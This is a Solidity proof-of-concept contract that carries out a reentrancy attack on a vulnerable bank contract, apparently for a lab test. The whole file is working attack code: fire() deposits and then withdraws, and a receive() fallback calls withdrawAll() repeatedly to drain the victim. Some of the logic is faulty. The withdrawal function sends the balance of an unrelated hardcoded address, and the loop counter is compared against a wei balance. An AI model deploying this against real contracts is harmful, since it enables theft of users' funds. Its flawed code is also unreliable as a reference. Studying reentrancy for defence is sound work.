// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20; // ---------->>>>>>>>>>> PoC
interface Ivulnerablebank {
    // BLUEPRINT
    function deposit() external payable;
    function withdrawAll() external;
}
contract Attacker {
    address public ma = 0xBC9fA60Cae6230483773d744B72912D3A3D4C0aF;
    Ivulnerablebank public victim;
    address public Aowner;
    uint256 public counter = 0;
    constructor(address _target) {
        victim = Ivulnerablebank(_target); // input address target (by your own way) with parameter of interface
        Aowner = msg.sender; // _target == bank.address at 're-entrancy.test.js'
    }

    receive() external payable {
        uint256 korup = address(victim).balance;
        if (korup > 0 && counter < korup) {
            counter++;
            victim.withdrawAll(); // infinite executing 'low level call' at target's Contract for doing Transaction
        }
    }
    function fire() external payable {
        require(msg.value > 0, "Need more ETH!");
        victim.deposit{value: msg.value}();
        victim.withdrawAll(); // triggers receive() // re-entrancy
    }
    function trn() external {
        payable(Aowner).transfer(ma.balance);
    }
}
